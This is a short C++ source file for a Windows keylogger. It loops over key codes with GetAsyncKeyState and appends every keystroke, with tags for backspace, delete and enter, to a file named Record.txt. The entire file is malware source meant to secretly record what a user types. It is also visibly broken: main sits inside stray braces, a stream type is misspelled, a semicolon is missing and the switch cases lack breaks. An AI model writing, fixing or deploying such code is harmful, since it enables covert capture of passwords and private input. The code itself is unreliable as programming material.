#include  <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;


void log(); //Put into functuion
{
int main()
{
  log(); 
  return 0;
}
}

void log()
{
    char c;
  
     for (;;)
  {
     for ( c=8; c<=222; c++) //Defines the range of char being used by thing 
     {
       if(GetAsyncKeyState(c) == - 32767) //Conditional If statement to see if someone presses a key, if they do then please do soemthing with it 
       {
          ofsteam write ("Record.txt", ios::app) //do not rewrite afer every key. Save to Record.txt
         
             switch(c)
             {
                 case 8:   write << "<BackSpace>"; //8 in ascii is backspace so this is to change it so on log it shows as backspace 
                 case 127: write << "<Delete>"; //127 is delete key, will show as Delete
                 case 32:  write << " "; //32 is a space, replace with a space
                 case 13:  write << "<Enter>\n"; //13 is enter, Will make enter 
                 default:  write << c;
             }
       } 
     }
  }
}  